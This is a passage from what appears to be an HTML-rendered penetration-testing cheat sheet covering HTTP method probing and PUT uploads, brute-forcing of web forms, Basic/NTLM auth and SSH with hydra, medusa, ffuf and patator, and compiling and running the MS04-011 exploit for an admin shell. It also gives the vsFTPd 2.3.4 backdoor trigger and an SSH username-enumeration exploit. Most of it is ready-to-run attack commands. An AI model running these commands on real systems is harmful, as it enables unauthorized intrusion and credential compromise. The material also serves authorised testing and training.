<span class="c">#</span>
<span class="c"># The first socket call is equivalent to</span>
<span class="c">#   socket$s,PF_INET,SOCK_STREAM,</span>
<span class="c">#            getprotobyname("tcp")</span>
<span class="c"># Packed arrays structure:</span>
<span class="c"># [ &lt;Sock-Level&gt;, &lt;Level-Opt&gt;, &lt;Rest*&gt; ]</span>
<span class="c"># Sock-Level 1 -&gt; SOL_SOCKET</span>
<span class="c">#   Level-Opt 13 -&gt; SO_LINGER</span>
<span class="c">#   Level-Opt 20 -&gt; SO_RCVTIMEO</span>
<span class="c">#   Level-Opt 21 -&gt; SO_SNDTIMEO</span>
<span class="c">#   See man socket7,asm-generic/socket.h</span>
<span class="c"># Sock-Level 6 -&gt; getprotobyname("tcp")</span>
<span class="c">#              or Socket::IPPROTO_TCP</span>
<span class="c">#   Level-Opt18 Socket::TCP_USER_TIMEOUT</span>
<span class="c">#   See man tcp7 &amp; ip7, and linux/tcp.h</span></code></pre></div></div></li> </ul> <h3 id="protocols--http---https--methods"> <a href="#protocols--http---https--methods" class="anchor-heading" aria-labelledby="protocols--http---https--methods"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Methods </h3> <h4 id="protocols--http---https--methods--identification"> <a href="#protocols--http---https--methods--identification" class="anchor-heading" aria-labelledby="protocols--http---https--methods--identification"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Identification </h4> <ul> <li>Use <a href="https://nmap.org/nsedoc/scripts/http-methods.html">Nmap NSE http-methods</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Select path: http-methods.url-path</span>
nmap <span class="nt">--script</span><span class="o">=</span>http-methods
<span class="c"># Unsafe args: http-methods.test-all</span>
<span class="c"># Individually: http-methods.retest</span></code></pre></div></div></li> <li>Different directories may support different methods:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># See first the helpers below</span>
<span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do </span>nmap <span class="nt">-sT</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">--script</span><span class="o">=</span>http-methods <span class="nt">--script-args</span><span class="o">=</span>http-methods.test-all,http-methods.url-path<span class="o">=</span><span class="s2">"/</span><span class="nv">$p</span><span class="s2">/"</span> <span class="nt">-p</span>&lt;port&gt; &lt;ip&gt;<span class="p">;</span> <span class="k">done</span> &lt; <span class="s2">"&lt;path-list&gt;"</span></code></pre></div></div></li> <li>Trim the domain from the URLs:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s, *https\?://[^/]*/,,p'</span> <span class="s2">"&lt;path-list&gt;"</span> <span class="o">&gt;</span> trim.paths</code></pre></div></div></li> <li>Generate all the intermediary paths:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s,/$,,;:a;p;s,/[^/]*$,,;ta'</span> trim.paths | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> all.paths</code></pre></div></div></li> </ul> <h4 id="protocols--http---https--methods--put"> <a href="#protocols--http---https--methods--put" class="anchor-heading" aria-labelledby="protocols--http---https--methods--put"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PUT </h4> <h5 id="protocols--http---https--methods--put--notes"> <a href="#protocols--http---https--methods--put--notes" class="anchor-heading" aria-labelledby="protocols--http---https--methods--put--notes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Notes </h5> <ul> <li>Sites may deny files with specific extensions like <code>.php</code> but not <code>.php5</code></li> </ul> <h5 id="protocols--http---https--methods--put--check-all-subdirs"> <a href="#protocols--http---https--methods--put--check-all-subdirs" class="anchor-heading" aria-labelledby="protocols--http---https--methods--put--check-all-subdirs"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Check All Subdirs </h5> <ul> <li>Assume you have a file with full URLs<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Without trailing slash: $,/, -&gt; $,,</span>
<span class="nb">sed</span> <span class="s1">'s, *https\?://,,;:a;s,/[^/]\+/\?$,/,p;ta'</span> furls.txt | <span class="nb">sort</span> <span class="nt">-u</span> | httprobe <span class="o">&gt;</span> sdirs.txt

<span class="c"># Alternative using Zsh builtins</span>
<span class="k">while </span><span class="nb">read </span>f<span class="p">;</span> <span class="k">do while</span> <span class="o">!</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$f</span><span class="s2">"</span> <span class="o">=</span>~ <span class="s2">".*&lt;site.com&gt;/$"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do </span><span class="nv">f</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">f</span>:h<span class="k">}</span><span class="s2">/"</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$f</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> &lt; furls.txt | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> sdirs.txt</code></pre></div></div></li> <li>Probe each subdir with <code>curl</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>u<span class="p">;</span> <span class="k">do while</span> :<span class="p">;</span> <span class="k">do</span> <span class="o">{</span> <span class="nb">timeout </span>3 curl <span class="nt">-ski</span> <span class="nt">-X</span> OPTIONS <span class="s2">"</span><span class="nv">$u</span><span class="s2">"</span> 2&gt;&amp;1 <span class="o">||</span> <span class="k">continue</span><span class="p">;</span> <span class="o">}</span> | <span class="o">{</span> <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'^$'</span> <span class="o">||</span> <span class="k">continue</span><span class="p">;</span> <span class="o">}</span> | <span class="o">{</span> <span class="nb">grep</span> <span class="nt">-o</span> <span class="s1">'.*\&lt;PUT\&gt;'</span> | <span class="nb">sed</span> <span class="s2">"i[</span><span class="nv">$u</span><span class="s2">]"</span><span class="s1">$'</span><span class="se">\n</span><span class="s1">a</span><span class="se">\n</span><span class="s1">'</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> &lt; sdirs.txt
<span class="c"># Might require GNU sed</span></code></pre></div></div></li> </ul> <h5 id="protocols--http---https--methods--put--nmap"> <a href="#protocols--http---https--methods--put--nmap" class="anchor-heading" aria-labelledby="protocols--http---https--methods--put--nmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Nmap </h5> <ul> <li>Use <a href="https://nmap.org/nsedoc/scripts/http-put.html">NSE http-put</a> to upload files:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Redirection cause false positives</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">--script</span><span class="o">=</span>http-put <span class="nt">--script-args</span><span class="o">=</span>http-put.url<span class="o">=</span><span class="s2">"&lt;dest-file-path&gt;"</span>,http-put.file<span class="o">=</span><span class="s2">"&lt;local-file-path&gt;"</span> <span class="nt">-p</span>&lt;port&gt; &lt;ip&gt;

<span class="c"># Use the Identificaton for loop</span>
<span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do </span>nmap <span class="nt">-sT</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">--script</span><span class="o">=</span>http-put <span class="nt">--script-args</span><span class="o">=</span>http-put.url<span class="o">=</span><span class="s2">"/</span><span class="nv">$p</span><span class="s2">/&lt;file.ext&gt;"</span>,http-put.file<span class="o">=</span><span class="s2">"&lt;local-file-path&gt;"</span> <span class="nt">-p</span>&lt;port&gt; &lt;ip&gt;<span class="p">;</span> <span class="k">done</span> &lt; &lt;fpaths&gt; 2&gt;&amp;1 | <span class="nb">grep</span> <span class="s2">"successfully"</span></code></pre></div></div></li> </ul> <h5 id="protocols--http---https--methods--put--curl"> <a href="#protocols--http---https--methods--put--curl" class="anchor-heading" aria-labelledby="protocols--http---https--methods--put--curl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Curl </h5> <ul> <li>Usage:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="s1">'Content-Type: text/plain; charset=utf-8'</span> <span class="nt">-T</span> <span class="s2">"&lt;local-file-path&gt;"</span> http://&lt;ip&gt;/&lt;<span class="nb">dir</span><span class="o">&gt;</span></code></pre></div></div></li> </ul> <h4 id="protocols--http---https--methods--get"> <a href="#protocols--http---https--methods--get" class="anchor-heading" aria-labelledby="protocols--http---https--methods--get"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GET </h4> <h5 id="protocols--http---https--methods--get--wget"> <a href="#protocols--http---https--methods--get--wget" class="anchor-heading" aria-labelledby="protocols--http---https--methods--get--wget"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Wget </h5> <ul> <li>Download all files recursively:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Don't recurse to the parent</span>
wget <span class="nt">--no-parent</span> <span class="nt">-r</span> &lt;url/path&gt;

<span class="c"># and don't download index files</span>
wget <span class="nt">--no-parent</span> <span class="nt">--reject</span> <span class="s2">"index*"</span> <span class="nt">-r</span> &lt;url/path&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--http---https--headers"> <a href="#protocols--http---https--headers" class="anchor-heading" aria-labelledby="protocols--http---https--headers"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Headers </h3> <h4 id="protocols--http---https--headers--keep-alive"> <a href="#protocols--http---https--headers--keep-alive" class="anchor-heading" aria-labelledby="protocols--http---https--headers--keep-alive"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Keep-Alive </h4> <ul> <li>Used for persistent connections</li> <li>Can be used to bypass WAF TCP connection limits and DoS</li> <li>Check if the server supports it:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s1">'Connection: keep-alive'</span> <span class="nt">-I</span></code></pre></div></div></li> <li>Test it with <a href="https://serverfault.com/a/199446">curl</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> <span class="s2">"&lt;url&gt;"</span> <span class="s2">"&lt;same-url&gt;"</span></code></pre></div></div></li> </ul> <h3 id="protocols--http---https--bruteforce"> <a href="#protocols--http---https--bruteforce" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="protocols--http---https--bruteforce--forms"> <a href="#protocols--http---https--bruteforce--forms" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--forms"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Forms </h4> <h5 id="protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass"> <a href="#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Dynamic CSRF / OAuth Token Protection Bypass </h5> <h6 id="protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--tools"> <a href="#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--tools" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tools </h6> <ul> <li><code>patator</code> is <a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/#Patator">able to do it</a> but might not be the most efficient if the server allows reusing the CSRF token a few times</li> <li><code>wfuzz</code> is also able to do it (and efficiently) via its python library using <a href="https://wfuzz.readthedocs.io/en/latest/library/guide.html#fuzzsession-object">FuzzSession</a> and modifying the <code>.fuzz()</code> parameters via the <a href="https://wfuzz.readthedocs.io/en/latest/library/guide.html#interacting-with-the-results">Result Object</a></li> </ul> <h6 id="protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--proxies"> <a href="#protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--proxies" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--forms--dynamic-csrf---oauth-token-protection-bypass--proxies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Proxies </h6> <ul> <li>All the other bruteforcers can obtain this feature via a proxy</li> <li>Burp Suite is <a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/#Hydra">able to do it</a> although not in the most efficient way if the server allows reusing CSRF tokens a few times</li> <li>Mitmproxy is also <a href="https://stackoverflow.com/a/70775093">able to do it</a> (and efficiently) by checking for CSRF errors in the response, saving the CSRF token &amp; repeating the request - <a href="https://github.com/tothi/oauth-mitmproxy/blob/master/oauth-mitmproxy-addon.py">see OAuth sample</a></li> </ul> <h5 id="protocols--http---https--bruteforce--forms--hydra"> <a href="#protocols--http---https--bruteforce--forms--hydra" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--forms--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h5> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Site</a> - Multi-protocol bruteforcer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># [!] Don't add http:// to &lt;ip&gt;</span>
<span class="c"># Use -S for SSL or -O -&gt; older SSL</span>
<span class="c"># Single user bruteforce</span>
hydra <span class="nt">-l</span> &lt;usr&gt; <span class="nt">-P</span> &lt;wordlist&gt; <span class="nt">-f</span> <span class="nt">-e</span> ns <span class="nt">-s</span> &lt;port&gt; &lt;ip&gt; http-post-form <span class="s1">'/path/to/form:user=&lt;user&gt;&amp;password=^PASS^:Invalid Password!'</span>
<span class="c"># -f -&gt; exits when finding 1 combo</span>
<span class="c"># Form fields: user and password</span>
<span class="c"># &lt;user&gt;&amp;&lt;pass&gt; taken from request</span>
<span class="c"># ^PASS^ is replaced by &lt;wlist&gt;</span>
<span class="c"># :F="Invalid Password!" if failure</span>
<span class="c"># Use :S=&lt;success-str&gt; otherwise</span>
<span class="c"># :A=(BASIC|NTLM|MD5) to set auth</span>
<span class="c"># :H=My\: Header to set headers</span>
<span class="c"># More info: hydra -U http-post</span></code></pre></div></div></li> <li><b>Only</b> ^USER^/^PASS^ get URL-encoded (<a href="https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-http-form.c#L743">ref</a>), <b>escape</b> non-delimiter colons</li> <li>Hydra doesn&#8217;t like named pipes as wordlists, use zsh <code>=()</code> temp files</li> <li>JSON/AJAX forms require headers (<a href="https://security.stackexchange.com/a/57858">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># JSON fields need double quotes</span>
hydra <span class="nt">-L</span> &lt;userwl&gt; <span class="nt">-P</span> &lt;passwl&gt; <span class="nt">-e</span> ns <span class="nt">-s</span> &lt;port&gt; &lt;ip&gt; http-post-form <span class="s1">'/path/to/api/auth:{"user"\:"^USER^","pass"\:"^PASS^"}:{"success"\:false}:H=Content-Type\: application/json;charset=utf-8'</span>
<span class="c"># Add -u for spraying</span>
<span class="c"># Use curl's resp-body as Fail-cond</span>
<span class="c"># If more headers are required, do</span>
<span class="c"># escape : from the url http\://</span></code></pre></div></div></li> <li>For JSON/AJAX use the latest master as there are <a href="https://github.com/vanhauser-thc/thc-hydra/issues/448">two</a> <a href="https://github.com/vanhauser-thc/thc-hydra/issues/654">bugs</a> in version &lt; 9.3</li> </ul> <h4 id="protocols--http---https--bruteforce--basic---digest---ntlm"> <a href="#protocols--http---https--bruteforce--basic---digest---ntlm" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--basic---digest---ntlm"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Basic / Digest / NTLM </h4> <h5 id="protocols--http---https--bruteforce--basic---digest---ntlm--medusa"> <a href="#protocols--http---https--bruteforce--basic---digest---ntlm--medusa" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--basic---digest---ntlm--medusa"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Medusa </h5> <ul> <li><a href="http://foofus.net/goons/jmk/medusa/medusa.html">Site</a> - <a href="https://github.com/jmk-foofus/medusa/">Repo</a> (<a href="https://github.com/jmk-foofus/medusa/pull/53">fix</a>) - Login bruteforcer<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Unable to filter codes/redirs</span>
medusa <span class="nt">-h</span> &lt;ip/dom&gt; <span class="nt">-v</span> 4 <span class="nt">-b</span> <span class="nt">-M</span> http <span class="nt">-m</span> <span class="s2">"AUTH:BASIC"</span> <span class="nt">-m</span> <span class="s1">'DIR:/&lt;url&gt;'</span> <span class="nt">-s</span> <span class="nt">-t</span> 2 <span class="nt">-e</span> ns <span class="nt">-U</span> &lt;wusr&gt; <span class="nt">-P</span> &lt;wpwd&gt;
<span class="c"># -v 4        - See successful only</span>
<span class="c"># -b          - Hide banner</span>
<span class="c"># -t &lt;num&gt;    - Thread number</span>
<span class="c"># -T &lt;num&gt;    - Concurrent hosts</span>
<span class="c"># -M &lt;module&gt; - Choose module</span>
<span class="c"># -m &lt;param&gt;  - Module parameter</span>
<span class="c"># -s          - Use SSL</span>
<span class="c"># -n &lt;port&gt;   - Different port</span>
<span class="c"># -Z &lt;key&gt;    - Resume using key</span>
<span class="c"># -e [ns] - Try Null/Same usr-&gt;pwd</span>
<span class="c"># -[up] &lt;single-usr/pass&gt;</span>
<span class="c"># -[Ff] - 1 valid combo Any/1 host</span>
<span class="c"># -H &lt;host-list&gt; | -C &lt;combo-list&gt;</span>
<span class="c"># -d - * Modules | -q - All params</span></code></pre></div></div></li> </ul> <h5 id="protocols--http---https--bruteforce--basic---digest---ntlm--ffuf"> <a href="#protocols--http---https--bruteforce--basic---digest---ntlm--ffuf" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--basic---digest---ntlm--ffuf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ffuf </h5> <ul> <li>Adapt <a href="https://raw.githubusercontent.com/ffuf/ffuf-scripts/master/ffuf_basicauth.sh">ffuf_basicauth</a> from <a href="https://github.com/ffuf/ffuf-scripts">ffuf-scripts</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Change to Digest or NTLM if needed</span>
./ffuf_basicauth.sh &lt;wusr&gt; &lt;<span class="nb">pwd</span><span class="o">&gt;</span> | ffuf <span class="nt">-w</span> -:AUTH <span class="nt">-H</span> <span class="s2">"Authorization: Basic AUTH"</span> <span class="nt">-fc</span> 403 <span class="nt">-c</span> <span class="nt">-u</span> <span class="s1">'&lt;url&gt;'</span></code></pre></div></div></li> </ul> <h5 id="protocols--http---https--bruteforce--basic---digest---ntlm--patator"> <a href="#protocols--http---https--bruteforce--basic---digest---ntlm--patator" class="anchor-heading" aria-labelledby="protocols--http---https--bruteforce--basic---digest---ntlm--patator"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Patator </h5> <ul> <li><a href="https://github.com/lanjelot/patator">Site</a> - Multi-Purpose bruteforcer - <a href="https://raw.githubusercontent.com/lanjelot/patator/master/patator.py">raw</a><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Add to line 3965: if resolve:</span>
patator http_fuzz <span class="s1">'url=&lt;url&gt;'</span> <span class="nv">user_pass</span><span class="o">=</span>FILE0:FILE1 <span class="nv">0</span><span class="o">=</span><span class="s1">'&lt;wusr&gt;'</span> <span class="nv">1</span><span class="o">=</span><span class="s1">'&lt;wpwd&gt;'</span> <span class="nt">-x</span> ignore:code<span class="o">=</span>401
<span class="c"># pathasis=1       - Send ../ as is</span>
<span class="c"># auth_type=basic  - Default</span>
<span class="c"># auto_urlencode=1 - Default</span>
<span class="c"># persistent=1     - Default</span>
<span class="c"># &gt; Change the 0 and 1 for spraying</span>
<span class="c">#</span>
<span class="c"># --allow-ignore-failures - Ignore...</span>
<span class="c"># -x ignore:code=xxx      - Errors</span></code></pre></div></div></li> </ul> <h2 id="protocols--rpc"> <a href="#protocols--rpc" class="anchor-heading" aria-labelledby="protocols--rpc"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RPC </h2> <h3 id="protocols--rpc--ms04-011"> <a href="#protocols--rpc--ms04-011" class="anchor-heading" aria-labelledby="protocols--rpc--ms04-011"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> MS04-011 </h3> <ul> <li>Used in Windows XP, also works in Win2k</li> <li>Check that the port 445 is open and that the <code>lsass.exe</code> (WinXP) or <code>netrap.dll</code> (Win2k) processes are running</li> <li>Obtain the exploit through <code>searchsploit -m 295</code> or <a href="https://www.exploit-db.com/exploits/295">exploit-db</a></li> <li>Add <code>#include &lt;stdio.h&gt;</code></li> <li>Compile it with:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i686-w64-mingw32-gcc 295.c <span class="nt">-o</span> ms04-011.exe <span class="nt">-lws2_32</span></code></pre></div></div></li> <li>Send it to the target an run it:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: 0 -&gt; WinXP ; 1/2 -&gt; Win2k Pro/Serv</span>
<span class="kd">ms04</span><span class="o">-</span><span class="m">011</span>.exe <span class="m">0</span> <span class="m">127</span>.0.0.1 <span class="m">9090</span></code></pre></div></div></li> <li>Connect to the port 9090 (locally) to obtain an admin shell</li> <li>There are some options for autodetect the OS (<code>-t</code>) and connect back to an IP (reverse-shell) instead of spawning the bind-shell but they weren&#8217;t tested</li> </ul> <h2 id="protocols--ftp"> <a href="#protocols--ftp" class="anchor-heading" aria-labelledby="protocols--ftp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> FTP </h2> <h3 id="protocols--ftp--enumeration"> <a href="#protocols--ftp--enumeration" class="anchor-heading" aria-labelledby="protocols--ftp--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <h4 id="protocols--ftp--enumeration--netcat"> <a href="#protocols--ftp--enumeration--netcat" class="anchor-heading" aria-labelledby="protocols--ftp--enumeration--netcat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Netcat </h4> <ul> <li>Banner grab and interact:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> &lt;ip&gt; 21</code></pre></div></div></li> <li>Commands:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Log in</span>
USER &lt;username&gt;
PASS &lt;password&gt;
<span class="c"># The order may have to be reversed</span></code></pre></div></div></li> </ul> <h4 id="protocols--ftp--enumeration--ftp"> <a href="#protocols--ftp--enumeration--ftp" class="anchor-heading" aria-labelledby="protocols--ftp--enumeration--ftp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> FTP </h4> <ul> <li>Connect:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;ip&gt;
<span class="c"># Use anonymous as name to anon user</span></code></pre></div></div></li> <li>Commands:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># OS (more or less</span>
system

<span class="c"># Current path</span>
<span class="nb">pwd</span>

<span class="c"># List files</span>
<span class="nb">ls</span> / <span class="nb">dir</span>

<span class="c"># Change directory</span>
<span class="nb">cd</span> &lt;<span class="nb">dir</span><span class="o">&gt;</span>

<span class="c"># Delete file</span>
del &lt;file&gt;

<span class="c"># Set binary mode for transfers</span>
binary

<span class="c"># Download</span>
get &lt;file&gt;

<span class="c"># Upload</span>
put &lt;local-file&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--ftp--backdoors"> <a href="#protocols--ftp--backdoors" class="anchor-heading" aria-labelledby="protocols--ftp--backdoors"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Backdoors </h3> <h4 id="protocols--ftp--backdoors--vsftpd-2-3-4"> <a href="#protocols--ftp--backdoors--vsftpd-2-3-4" class="anchor-heading" aria-labelledby="protocols--ftp--backdoors--vsftpd-2-3-4"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> vsFTPd 2.3.4 </h4> <ul> <li>Trigger: Username ending in <code>:)</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> &lt;ip&gt; &lt;ftp-port&gt;

USER <span class="nb">test</span>:<span class="o">)</span>

PASS <span class="nb">test</span></code></pre></div></div></li> <li>Connect to backdoor:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nv</span> &lt;ip&gt; 6200
<span class="c"># Will only work if the firewall is</span>
<span class="c"># not blocking it</span>
<span class="c"># Note that it may still be the way</span>
<span class="c"># to elevate privileges from inside</span></code></pre></div></div></li> </ul> <h2 id="protocols--ssh"> <a href="#protocols--ssh" class="anchor-heading" aria-labelledby="protocols--ssh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSH </h2> <h3 id="protocols--ssh--bruteforce"> <a href="#protocols--ssh--bruteforce" class="anchor-heading" aria-labelledby="protocols--ssh--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="protocols--ssh--bruteforce--usernames"> <a href="#protocols--ssh--bruteforce--usernames" class="anchor-heading" aria-labelledby="protocols--ssh--bruteforce--usernames"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Usernames </h4> <ul> <li>Using <a href="https://www.exploit-db.com/exploits/45939">EID 45939</a> and <code>xargs</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt; &lt;userlist&gt; xargs <span class="nt">-P</span> 10 <span class="nt">-I</span> <span class="o">{}</span> python2 45939.py <span class="nt">-p</span> &lt;port&gt; &lt;ip&gt; <span class="o">{}</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="s1">' valid'</span>
<span class="c"># Unlimited procs kill the process</span></code></pre></div></div></li> </ul> <h4 id="protocols--ssh--bruteforce--passwords"> <a href="#protocols--ssh--bruteforce--passwords" class="anchor-heading" aria-labelledby="protocols--ssh--bruteforce--passwords"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Passwords </h4> <h5 id="protocols--ssh--bruteforce--passwords--hydra"> <a href="#protocols--ssh--bruteforce--passwords--hydra" class="anchor-heading" aria-labelledby="protocols--ssh--bruteforce--passwords--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h5> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Site</a> - Multi-protocol bruteforcer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -s &lt;alt-port&gt;</span>
hydra <span class="nt">-l</span> &lt;user&gt; <span class="nt">-P</span> &lt;pass-wlist&gt; <span class="nt">-e</span> ns ssh://&lt;server&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--ssh--shellshock---cve-2014-6271"> <a href="#protocols--ssh--shellshock---cve-2014-6271" class="anchor-heading" aria-labelledby="protocols--ssh--shellshock---cve-2014-6271"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Shellshock - CVE-2014-6271 </h3> <ul> <li>OpenSSH with ForceCommand feature and bash &lt; bash43-027</li> </ul> <h3 id="protocols--ssh--cve-2015-6565"> <a href="#protocols--ssh--cve-2015-6565" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2015-6565"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CVE-2015-6565 </h3> <h4 id="protocols--ssh--cve-2015-6565--affected"> <a href="#protocols--ssh--cve-2015-6565--affected" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2015-6565--affected"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Affected </h4> <ul> <li>OpenSSH 6.8 &lt; 6.9</li> </ul> <h4 id="protocols--ssh--cve-2015-6565--exploit"> <a href="#protocols--ssh--cve-2015-6565--exploit" class="anchor-heading" aria-labelledby="protocols--ssh--cve-2015-6565--exploit"><svg viewBox="0 0 16 16" 